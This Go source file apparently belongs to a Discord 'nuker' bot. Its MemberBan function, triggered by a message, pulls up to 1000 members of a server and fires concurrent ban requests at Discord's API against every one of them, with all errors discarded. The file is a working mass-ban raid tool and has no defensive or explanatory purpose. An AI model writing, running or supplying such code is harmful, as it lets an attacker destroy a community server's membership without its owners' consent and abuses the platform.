package removing

import (
	"Dynamic/core/requests"
	"encoding/json"
	"sync"

	"github.com/bwmarrin/discordgo"
)

func MemberBan(s *discordgo.Session, m *discordgo.MessageCreate) {
	members, _ := s.GuildMembers(m.GuildID, "", 1000)
	smoothed := requests.Smooth(members)

	for _, ch := range smoothed {
		wg := new(sync.WaitGroup)
		wg.Add(len(ch))
		for _, role := range ch {
			go func(ch *discordgo.Member) {
				defer wg.Done()

				dataMap := map[string]int{"delete_message_days?": 0, "delete_message_seconds?": 0}
				jsonData, _ := json.Marshal(dataMap)

				requests.Sendhttp("https://discord.com/api/v9/guilds/"+m.GuildID+"/bans/"+ch.User.ID, "PUT", jsonData)
			}(role)
		}
		wg.Wait()
	}

}
